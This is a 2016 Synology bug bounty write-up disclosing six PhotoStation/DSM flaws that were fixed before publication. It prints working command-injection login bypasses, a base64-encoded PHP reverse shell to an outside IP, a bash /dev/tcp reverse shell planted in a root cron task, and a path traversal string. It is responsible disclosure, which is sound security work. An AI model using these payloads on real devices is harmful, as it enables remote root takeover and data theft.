title: '[Synology Bug Bounty 2016]'
author: BambooFox
tags:
  - web
  - 'Synology Bug Bounty '
  - bug bounty
  - DoS
  - LFI
  - command injection
categories:
  - write-ups
  - bug-bounty-report
date: 2017-03-20 07:28:00
---
Synology Bug Bounty Report
=============

> Author: BambooFox Team 
> ( Henry, jpeanut, ding, leepupu, Angelboy, boik, adr, Mango King, Bletchley )

Last year ( 2016 ) , we BambooFox were invited to join the Synology Bug Bounty program. After about 2 months of hacking, we discovered several vulnerabilities, including a **remote root code execution** vulnerability. Synology engineers response and fix the vulnerabilities in a very short time, which shows they pay a lot of attention to security issues.

And now ( in 2017 ) , we are allowed to publish the vulnerabilities:  
* [Vul-01 PhotoStation Login without password](#Vul-01-PhotoStation-Login-without-password )
* [Vul-02 PhotoStation Remote Code Execution](#Vul-02-PhotoStation-Remote-Code-Execution)
* [Vul-03 Read-Write Arbitrary Files](#Vul-03-Read-Write-Arbitrary-Files)
* [Vul-04 Privilege Escalation](#Vul-04-Privilege-Escalation)
* [Vul-05 DoS via Blocking IP](#Vul-05-DoS-via-Blocking-IP)
* [Vul-06 Local File Inclusion](#Vul-06-Local-File-Inclusion)

## Vul-01: PhotoStation Login without password
---
We mostly focus on **PhotoStation**, which is the picture management system enabled in most Synology DSM ( DiskStation Manager ).

The first vulnerability allowed us to **login as admin without entering the password.**

PoC1:
```
GET //photo/login.php?usr=admin&sid=xxx&SynoToken=/bin/true HTTP/1.1
Host: bamboofox.hopto.org
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
Accept:    text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
X-Forwarded-For: |
Cookie: stay_login=0; language=en; PHPSESSID=ime6mqrg0pghbjo4p9aomqcbv0; left-panel-visibility=show
Connection: close
```

The key points are the `|` character in the `X-Forwarded-For` field and `/bin/true` in the get parameter `SynoToken`. The server site CGI will concatenate the strings in `usr`, `X-Forwarded-For` and `SynoToken` into a command and execute the command, and the special characters `|` and `>` aren't filtered out correctly, which will lead to the **command injection** vulnerability. 

Therefore in our PoC1, the command will become:
```
/usr/syno/bin/synophoto_dsm_user username | /bin/true
```

The command will return 0 (True) and thus bypass the authentication.

**Result:
Adversary can login as admin without password**

![Login without password](http://i.imgur.com/pnIWZ6t.png)

Adversary can also login as admin by the following PoC:

```
GET /photo/photo_login.php
action=login&username=admin&password=%26
```

The source code that handle the user authentication are in `photo_login.php`:

```php
$retval = csSYNOPhotoMisc::ExecCmd('/usr/syno/bin/synophoto_dsm_user', array('--auth', $user, $pass), false, $result);
```

Once the `$pass` variable is `&`, the command will be executed in the background and always return 0 (true), thus the adversary can login as admin.


## Vul-02: PhotoStation Remote Code Execution
---
After we successfully login as admin via the command injection vulnerability, we extended the attack surface to attempt remote code execution.

PoC2: 
1 . Encode the command into base64 format
```
base64encode( $sock=fsockopen("......",8080);exec("/bin/sh -i <&3 >&3 2>&3"); )
=> JHNvY2s9ZnNvY2tvcGVuKCIzNi4yMzEuNjguMjE1Iiw4MDgwKTtleGVjKCIvYmluL3NoIC1pIDwmMyA+JjMgMj4mMyIpOw==
```

2 . Send the payload
```
GET //photo/login.php?usr=|&sid=php&SynoToken=eval%28base64_decode%28%22JHNvY2s9ZnNvY2tvcGVuKCIzNi4yMzEuNjguMjE1Iiw4MDgwKTtleGVjKCIvYmluL3NoIC1pIDwmMyA%2bJjMgMj4mMyIpOw%3D%3D%22%29%29%3B HTTP/1.1
Host: bamboofox.hopto.org
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
X-Forwarded-For: -r
Cookie: stay_login=0; language=en; PHPSESSID=ime6mqrg0pghbjo4p9aomqcbv0; left-panel-visibility=show
Connection: close
```

We adopted a similar approach (PoC1) in order to achieve RCE.

We then took a deep look into the source code of PhotoStation, and found the following code:
```php
if ($x_forward) {
    $ip = $x_forward;
}
// ...
$retval = csSYNOPhotoMisc::ExecCmd('/usr/syno/bin/synophoto_dsm_user', array('--current', $user, $session_id, $ip, $synotoken), false, $isValidUser);

if ($retval === 0) {
    $login_status = true;
} else {
    // login failed
}
```

In this code snippet, `$user`, `$ip` and `$synotoken` can be easily controlled by crafting the HTTP headers, and that's the original cause of the command injection vulnerability.  
Our first few attempts failed due to the site filtered out some special characters. However, we noticed that the site did not filtered out all the special characters. Here's the code that indicated the non-filtered characters:
```php
static $skipEscape = array('>', '<', '|', '&');
```

As a result of the code above, `>`, `<`, `|` and `&` can be used to achieve command injection.

![Remote Code Execution](http://i.imgur.com/qJxpKq8.png)

## Vul-03: Read-Write Arbitrary Files
---
After we got the shell, we continued to find security flaws in the DSM. The binary program `synophoto_dsm_user` got our attention. This binary is a **setuid program**, and has a powerful copy function.  
With the `--copy root` parameter, it will do the `cp` command and **copy a file with the root permission**. This make us have the ability to read/write an arbitrary file .

## Vul-04: Privilege Escalation
---
With the previous Vul-02 ( RCE ) and Vul-03 ( Read-Write Arbitrary Files ), we can exploit the vulnerability and **escalate our privilege to root**. We first tried modify the `/etc/crontab` file, but failed due to the [AppArmor](https://en.wikipedia.org/wiki/AppArmor) protection. So we change our target to the file that will be invoked by crontab. Finally we found `/tmp/synoschedtask`, a task which will be invoked by crontab as root. We use `synophoto_dsm_user` to modify its file content to the following command:
```
/volume1/photo/bash -c '/volume1/photo/bash -i >& /dev/tcp/x.x.x.x/yyyyy 0>&1'
```

Now we can wait for our reverse shell, with the root permission.
![Remote Code Execution](http://i.imgur.com/5YrQU54.jpg)


Also by exploiting Vul-02 and Vul-03, we're able to login the service as admin. If the admin is logged in, we can use the following command to get the admin's session ID:

```
usr/syno/bin/synophoto_dsm_user --copy root /usr/syno/etc/private/session/current.users /volume1/photo/current.users
```

Although the server side will check the admin's IP address, but the check can be bypassed easily by forging the `X-Forwarded-For` header.

**Login as admin give us the ability to execute command with the root permission**. For example, we can execute our own command as root with the help of **Task Scheduler**. This result in a privilege escalation as well.


## Vul-05: DoS via Blocking IP
---
We also found some other security flaws.
If a user sends too many requests to `forget_passwd.cgi`, the user will be blocked by his IP, which is retrieved from the `X-Forwarded-For` header.
However, `X-Forwarded-For` can be easily forged from the client side, therefore an attacker can block as many users as he wants by forging the `X-Forwarded-For` header, leading a DoS attack.
![Block IP](http://i.imgur.com/aU9IDWm.png)

## Vul-06: Local File Inclusion
---
There's a LFI (Local File Inclusion) vulnerability in `download.php`. The `id` parameter is controllable.  
For example, we can use `../../../../../../var/services/homes/[username]/.gitconfig` to download a user's git config file.

![Local File Inclusion](http://i.imgur.com/ZpL5Tw7.png)  



## Timeline
* 2016/07/25 Report vulnerabilities to Synology
* 2016/09/01 Confirm that all vulnerabilities have already been fixed by Synology
* 2017/03/13 Confirm that we're allowed to publish the bug bounty report
* 2017/03/20 Synology Bug Bounty Report published


## Note
Some of the vulnerabilities have already been discovered by Lucas Leong from Trend Micro ( [link](http://seclists.org/oss-sec/2016/q1/236) )